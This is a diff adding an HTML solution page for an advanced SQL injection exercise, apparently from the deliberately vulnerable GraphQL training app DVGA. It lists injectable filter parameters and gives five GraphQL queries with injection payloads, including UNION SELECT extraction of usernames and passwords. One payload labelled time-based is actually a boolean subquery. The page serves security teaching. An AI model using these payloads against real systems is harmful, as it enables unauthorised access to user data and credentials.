@@ -1,0 +1,79 @@
+<!-- Start -->
+<h3 style="color:purple" id="inj-sql-advanced"><b>Injection :: Advanced SQL Injection</b></h3>
+<hr />
+<h5>Problem Statement</h5>
+<p>
+  The application contains multiple SQL injection vulnerabilities in different query resolvers. These vulnerabilities allow attackers to manipulate SQL queries by injecting malicious SQL code through various filter parameters.
+</p>
+<p>
+  The vulnerabilities exist in:
+  <ul>
+    <li><code>users</code> query with <code>filter</code> parameter</li>
+    <li><code>audits</code> query with <code>filter</code> parameter</li>
+    <li><code>pastes_by_owner</code> query with <code>owner_filter</code> parameter</li>
+  </ul>
+</p>
+<p>
+  These vulnerabilities demonstrate different types of SQL injection scenarios including simple string interpolation, LIKE queries, and complex JOIN operations.
+</p>
+<h5>Resources</h5>
+<ul>
+  <li>
+    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
+      <i class="fa fa-newspaper"></i> OWASP - SQL Injection
+    </a>
+  </li>
+  <li>
+    <a href="https://portswigger.net/web-security/sql-injection" target="_blank">
+      <i class="fa fa-newspaper"></i> PortSwigger - SQL Injection
+    </a>
+  </li>
+</ul>
+<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-inj-sql-advanced')">Show</button></h5>
+<div id="sol-inj-sql-advanced" style="display:none">
+<pre class="bash">
+# 1. SQL Injection in users query
+query {
+  users(filter:"admin' OR '1'='1") {
+    username
+    email
+  }
+}
+
+# 2. SQL Injection in audits query
+query {
+  audits(filter:"' UNION SELECT 1,2,3,4--") {
+    gqloperation
+    gqlquery
+    timestamp
+  }
+}
+
+# 3. SQL Injection in pastes_by_owner query
+query {
+  pastesByOwner(ownerFilter:"DVGAUser' OR 1=1--") {
+    title
+    content
+    owner {
+      name
+    }
+  }
+}
+
+# 4. More advanced payloads for data extraction
+query {
+  users(filter:"admin' UNION SELECT username,password,email FROM users--") {
+    username
+    email
+  }
+}
+
+# 5. Time-based blind SQL injection
+query {
+  audits(filter:"' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='users')>0--") {
+    gqloperation
+  }
+}
+</pre>
+</div>
+<!-- End -->
